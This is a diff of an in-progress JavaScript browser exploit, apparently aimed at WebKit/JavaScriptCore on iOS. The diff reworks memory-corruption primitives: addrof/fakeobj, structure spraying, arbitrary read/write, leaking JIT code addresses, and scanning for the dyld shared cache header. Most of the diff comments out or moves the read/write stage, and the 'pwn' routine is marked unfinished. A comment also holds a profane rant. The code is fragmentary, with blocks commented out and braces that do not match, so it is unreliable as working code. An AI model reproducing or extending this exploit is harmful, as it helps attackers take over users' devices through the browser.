@@ -525,21 +525,8 @@ var VM_PROT_EXECUTE = 0x4
                     addrof(obj)
                 },
             }
-              /*fakeobj = (addr) => {
-                  fakeArr
-              }*/
-             //let me try my own fakeobj method.
-            
             port.postMessage("We got stableish addrof and fakeobj");
-            return rw;
-          }
-          
-
-          function arbrw(rw) {
-              var print = (msg) => {
-                  port.postMessage(msg)
-              };
-              // from saelo: spray structures to be able to predict their IDs.
+            // from saelo: spray structures to be able to predict their IDs.
     // from Auxy: I am not sure about why spraying. i change the code to:
     //
     // var structs = []
@@ -783,9 +770,17 @@ var VM_PROT_EXECUTE = 0x4
     print("[+] JITCode instance @ " + jitCodeAddr.toString());
     var anchor = memory.read64(jitCodeAddr);
     print("JavaScriptCore instance @" + anchor);
+          }
+          
+
+          /*function arbrw(rw) {
+              var print = (msg) => {
+                  port.postMessage(msg)
+              };
+              
               
 
-        /*while(true)
+        while(true)
         {
         FUCK THIS TEAM!!! Whole time header is just the Webcore header not the fucking shared cache header!!!! A whole year of struggling to get this update to work just to find out it's fucking wrong...
         if(strcmp(memory.read(hdr, 0x10), "dyld_v1   arm64")) //cache header magic
@@ -796,8 +791,8 @@ var VM_PROT_EXECUTE = 0x4
         }
         hdr = Sub(hdr, new Int64(0x1000));
         }
-        log("dyld shared cache header @" + hdr);*/
-        }
+        log("dyld shared cache header @" + hdr);
+        }*/
           function pwn() {
             try {
               var set = setupPrimitives();
@@ -806,7 +801,7 @@ var VM_PROT_EXECUTE = 0x4
               gc();
 
               // TODO: rest of exploit goes here
-              arbrw(set);
+              //arbrw(set);
               port.postMessage("done!");
             } catch(e) { // send exception strings to main thread (for debugging)
               port.postMessage("Exception!!");
